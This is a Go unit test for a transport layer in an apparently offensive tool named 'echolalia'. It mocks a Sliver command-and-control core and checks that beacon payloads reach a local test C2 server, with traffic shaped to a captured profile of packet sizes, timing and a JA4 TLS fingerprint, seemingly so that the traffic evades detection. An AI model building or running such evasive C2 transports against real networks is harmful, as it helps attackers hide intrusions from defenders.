package transport

import (
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"sync/atomic"
	"testing"
	"time"

	"github.com/Emul4nt/echolalia/profiler"
)

type mockSliverCore struct {
	payload   []byte
	responses [][]byte
}

func (m *mockSliverCore) GetBeaconPayload() ([]byte, error) {
	return m.payload, nil
}

func (m *mockSliverCore) DeliverResponse(data []byte) error {
	m.responses = append(m.responses, data)
	return nil
}

func TestTransport_SendsBeaconToC2(t *testing.T) {
	var receivedCount int64

	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		io.ReadAll(r.Body)
		atomic.AddInt64(&receivedCount, 1)
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	core := &mockSliverCore{payload: []byte("test beacon payload for echolalia transport")}

	profile := &profiler.TrafficProfile{
		CaptureMethod: "pcap",
		AvgPktSize:    800,
		PktSizeStddev: 100,
		PktSizeHist:   uniformHist(10),
		AvgIAT:        0.001,
		IATStddev:     0.0001,
		IATDistShape:  "normal",
		JA4:           "t13d1516h2_8daaf6152771_e5627efa2ab1",
		Protocol:      "http1",
	}

	transport := &EcholaliaTransport{
		core:    core,
		profile: profile,
		c2URL:   srv.URL + "/beacon",
		client:  srv.Client(),
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	if err := transport.Beacon(ctx); err != nil {
		t.Fatalf("Beacon: %v", err)
	}

	if atomic.LoadInt64(&receivedCount) == 0 {
		t.Error("C2 server received no requests")
	}
}

func uniformHist(n int) []float64 {
	h := make([]float64, n)
	for i := range h {
		h[i] = 1.0 / float64(n)
	}
	return h
}
